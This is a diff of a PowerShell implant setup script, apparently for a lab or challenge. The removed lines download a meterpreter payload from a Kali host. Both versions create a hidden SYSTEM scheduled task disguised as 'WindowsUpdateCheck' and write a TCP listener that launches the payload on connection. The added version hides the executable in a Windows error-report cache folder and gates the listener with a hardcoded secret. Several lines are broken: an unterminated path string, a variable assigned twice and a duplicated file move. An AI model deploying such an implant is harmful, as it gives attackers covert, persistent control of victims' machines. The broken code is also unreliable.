@@ -1,101 +1,113 @@
 # === Implant Setup Script ===
-# Drops challenge wrapper, meterpreter payload, creates scheduled task, and starts immediately
+# Drops challenge wrapper, content, creates scheduled task, and starts immediately
 
 $kaliIP = "172.30.119.180"
 $baseURL = "http://${kaliIP}:8080"
-$basePath = "C:\Windows
+$contentPath = $env:LOCALAPPDATA\Microsoft\Windows\WER\ReportArchive\Cache\update.exe
+$sourceExe     = ".\update.exe"
+$taskName      = "WindowsUpdateCheck"
 $challengePort = 4444
 $meterPort = 5555
-$payloadPath = "$basePath\update_check.exe"
+$contentPath = "$basePath\update_check.exe"
 $wrapperPath = "$basePath\challenge_wrapper.ps1"
+$authToken = "blueswindowmachine"
 
-# Step 1: Create directory
-New-Item -ItemType Directory -Path $basePath -Force | Out-Null
-Write-Host "[*] Directory created." -ForegroundColor Green
+# Step 1: Move target
+Move-Item -Path .\update.exe -Destination "$env:LOCALAPPDATA\Microsoft\Windows\WER\ReportArchive\Cache\challenge_wrapper.exe" -Force
+Move-Item -Path .\update.exe -Destination "$env:LOCALAPPDATA\Microsoft\Windows\WER\ReportArchive\Cache\update.exe" -Force
+Write-Host "[*] Moved to $env:LOCALAPPDATA\Microsoft\Windows\WER\ReportArchive\Cache\update.exe" -ForegroundColor Green
 
-# Step 2: Download meterpreter payload
-Invoke-WebRequest -Uri "$baseURL/update_check.exe" -OutFile $payloadPath
-if (Test-Path $payloadPath) {
-    Write-Host "[*] Payload downloaded successfully." -ForegroundColor Green
-} else {
-    Write-Host "[!] Payload download failed - is your HTTP server running?" -ForegroundColor Red
-    exit
+# === Step 1: Stage the payload ===
+$destDir = Split-Path $contentPath -Parent
+if (-not (Test-Path $destDir)) {
+    New-Item -ItemType Directory -Path $destDir -Force | Out-Null
 }
 
-# Step 3: Write the challenge wrapper (no auth for testing)
-$wrapper = @"
-`$port = $challengePort
-`$meterpreterPath = "$payloadPath"
+if (-not (Test-Path $sourceExe)) {
+    Write-Host "[!] Source $sourceExe not found." -ForegroundColor Red
+    exit 1
+}
 
-`$listener = [System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Any, `$port)
-`$listener.Start()
+Move-Item -Path $sourceExe -Destination $contentPath -Force
+if (Test-Path $contentPath) {
+    Write-Host "[*] Staged payload at $contentPath" -ForegroundColor Green
+} else {
+    Write-Host "[!] Failed to stage payload." -ForegroundColor Red
+    exit 1
+}
+
+# === Step 2: Write the wrapper ===
+# Double-quoted here-string: bare $vars expand NOW (baked into file as literals).
+# Backticked `$vars stay as literal $var in the file (evaluated at wrapper runtime).
+$wrapper = @"
+`$port      = $challengePort
+`$exePath   = "$contentPath"
+`$expected  = "$authToken"
+
+try {
+    `$listener = New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Any, `$port)
+    `$listener.Start()
+} catch {
+    exit 1
+}
 
 while (`$true) {
+    `$client = `$null
     try {
         `$client = `$listener.AcceptTcpClient()
+        `$client.ReceiveTimeout = 5000
         `$stream = `$client.GetStream()
+
+        `$reader = New-Object System.IO.StreamReader(`$stream)
         `$writer = New-Object System.IO.StreamWriter(`$stream)
         `$writer.AutoFlush = `$true
 
-        # No auth - just spawn meterpreter on any connection
-        `$writer.WriteLine("OK")
-
-        # Check if meterpreter is already running to avoid duplicate processes
-        `$running = Get-Process | Where-Object { `$_.Path -eq `$meterpreterPath }
-        if (-not `$running) {
-            Start-Process -FilePath `$meterpreterPath
-            `$writer.WriteLine("Meterpreter launched.")
-        } else {
-            `$writer.WriteLine("Meterpreter already running.")
+        # Require shared secret on the first line; drop otherwise.
+        `$line = `$reader.ReadLine()
+        if (`$line -ne `$expected) {
+            `$client.Close()
+            continue
         }
 
-        `$client.Close()
+        `$writer.WriteLine("OK")
+
+        `$running = Get-Process | Where-Object { `$_.Path -eq `$exePath }
+        if (-not `$running) {
+            Start-Process -FilePath `$exePath
+            `$writer.WriteLine("launched")
+        } else {
+            `$writer.WriteLine("already running")
+        }
     } catch {
-        # Silently continue on errors to keep wrapper alive
+        Start-Sleep -Milliseconds 500
+    } finally {
+        if (`$client -ne `$null) { `$client.Close() }
     }
 }
 "@
 
-$wrapper | Out-File -FilePath $wrapperPath -Encoding ASCII
+$wrapper | Out-File -FilePath $wrapperPath -Encoding ASCII -Force
 if (Test-Path $wrapperPath) {
-    Write-Host "[*] Challenge wrapper written successfully (auth disabled)." -ForegroundColor Yellow
+    Write-Host "[*] Wrapper written to $wrapperPath" -ForegroundColor Yellow
 } else {
-    Write-Host "[!] Failed to write challenge wrapper." -ForegroundColor Red
-    exit
+    Write-Host "[!] Failed to write wrapper." -ForegroundColor Red
+    exit 1
 }
 
-# Step 4: Create scheduled task for reboot persistence
-schtasks /create /tn "WindowsUpdateCheck" `
-    /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File $wrapperPath" `
+# === Step 3: Persistence via scheduled task ===
+schtasks /create /tn $taskName `
+    /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$wrapperPath`"" `
     /sc onstart `
     /ru SYSTEM `
-    /f
+    /f | Out-Null
 
-$task = schtasks /query /tn "WindowsUpdateCheck"
-if ($task) {
-    Write-Host "[*] Scheduled task created successfully." -ForegroundColor Green
+if ($LASTEXITCODE -eq 0) {
+    Write-Host "[*] Scheduled task '$taskName' created." -ForegroundColor Green
 } else {
-    Write-Host "[!] Scheduled task creation failed." -ForegroundColor Red
-    exit
+    Write-Host "[!] Scheduled task creation failed (exit $LASTEXITCODE)." -ForegroundColor Red
+    exit 1
 }
 
-# Step 5: Start wrapper immediately - no reboot needed
-Start-Process powershell.exe `
-    -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File $wrapperPath" `
-    -WindowStyle Hidden
-
-Write-Host "[*] Wrapper started immediately." -ForegroundColor Green
-
-# Step 6: Summary
-Write-Host ""
-Write-Host "===== IMPLANT INSTALLED =====" -ForegroundColor Cyan
-Write-Host "  Wrapper:   $wrapperPath" -ForegroundColor Cyan
-Write-Host "  Payload:   $payloadPath" -ForegroundColor Cyan
-Write-Host "  Task:      WindowsUpdateCheck (SYSTEM, runs on boot)" -ForegroundColor Cyan
-Write-Host "  Port:      $challengePort (trigger), $meterPort (meterpreter)" -ForegroundColor Cyan
-Write-Host "  Auth:      DISABLED (testing mode)" -ForegroundColor Yellow
-Write-Host ""
-Write-Host "===== NEXT STEPS =====" -ForegroundColor Yellow
-Write-Host "  1. On Kali: ./test_connect.sh to trigger meterpreter" -ForegroundColor Yellow
-Write-Host "  2. On Kali: run multi/handler on port $meterPort to catch session" -ForegroundColor Yellow
-Write-Host "=============================" -ForegroundColor Cyan
+# === Step 4: Kick it off now without waiting for reboot ===
+schtasks /run /tn $taskName | Out-Null
+Write-Host "[*] Task started. Listener should be live on port $challengePort." -ForegroundColor Green
